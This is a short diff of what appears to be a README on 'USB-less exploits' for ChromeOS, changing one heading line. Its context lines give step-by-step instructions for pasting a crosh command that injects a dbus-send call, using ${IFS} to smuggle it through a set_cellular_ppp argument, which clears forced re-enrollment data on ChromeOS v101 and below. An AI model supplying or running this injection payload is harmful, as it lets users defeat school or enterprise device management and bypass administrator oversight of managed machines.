@@ -86,7 +86,7 @@ There are four methods https://github.com/crosbreaker/baddieapple or https://git
 
 
 # USB-less Exploits:
-KERNVER 1, REQUIRES ChromeOS v101 and below: SHroot
+# KERNVER 1, REQUIRES ChromeOS v101 and below: SHroot
 1. open crosh, (ctrl+alt+t)
 2. paste the following in:
 3. ```set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'```
